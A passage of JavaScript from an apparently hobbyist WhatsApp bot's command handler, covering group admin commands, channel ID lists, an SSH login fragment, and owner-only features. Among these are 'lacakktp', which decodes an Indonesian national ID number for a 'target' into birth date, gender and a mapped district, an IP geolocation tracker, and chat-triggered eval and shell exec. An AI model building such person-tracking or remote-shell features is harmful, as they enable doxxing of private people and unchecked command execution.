                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('❌ *Wrong IP or Password!*');
    }).connect(connSettings);
}
break
  break;
case 'nikktp': case 'lacakktp':
    if (!isCreator) return Reply(mess.owner)
    if (!q) return Reply(`USE THIS MENU BY INCLUDE TARGET SAM : ${prefix + command} 9232875xxxxx\n\n`)
    
    const { nikParser } = require('nik-parser')
    const ktp = q
    const nik = nikParser(ktp)

    const provinsi = nik.province()
    const kabupaten = nik.kabupatenKota()
    const kecamatan = nik.kecamatan()

    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(kecamatan + ', ' + kabupaten + ', ' + provinsi)}`

    Reply(`Nik: ${nik.isValid()}
Province ID: ${nik.provinceId()}
Province Name: ${provinsi}
Regency ID: ${nik.kabupatenKotaId()}
Regency Name: ${kabupaten}
District ID: ${nik.kecamatanId()}
District Name: ${kecamatan}
Postal code: ${nik.kodepos()}
Gender: ${nik.kelamin()}
Date of birth: ${nik.lahir()}
Uniqcode: ${nik.uniqcode()}

📍 *Location on Maps:*\n(${mapsUrl})`)

break

case 'lacakip': case 'trackip': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`*Example:* ${prefix + command} 101.000.181`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await conn.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
Reply(formatIPInfo(res)); 
} catch (e) { 
Reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break;
case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/92343###"))
}
break;
}

case 'resetid': {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Reset file JSON dengan array kosong
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify([], null, 2));
    
    m.reply('✅ SUCCESSFULLY DELETED ALL CHANNEL IDS.');
  } catch (error) {
    console.error("Error while resetting ID:", error);
    m.reply('❌ An error occurred while deleting all IDs.');
  }
  break;
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listid': {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    if (daftarSaluran.length === 0) {
      return m.reply('❌ No channel ID registered.');
    }

    // Kirim daftar ID
    let teks = '*Channel ID List:*\n\n';
    daftarSaluran.forEach((id, i) => {
      teks += `${i + 1}. ${id}\n`;
    });
    m.reply(teks);
  } catch (error) {
    console.error("Error while reading ID list:", error);
    m.reply('❌ An error occurred while reading the ID list.');
  }
  }
break;
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("BOT ACTIVE BY SAMHAX ")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hello samhax boss, an error has occurred in the command :* ${isCmd ? prefix+command : m.text}

*Error information details :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});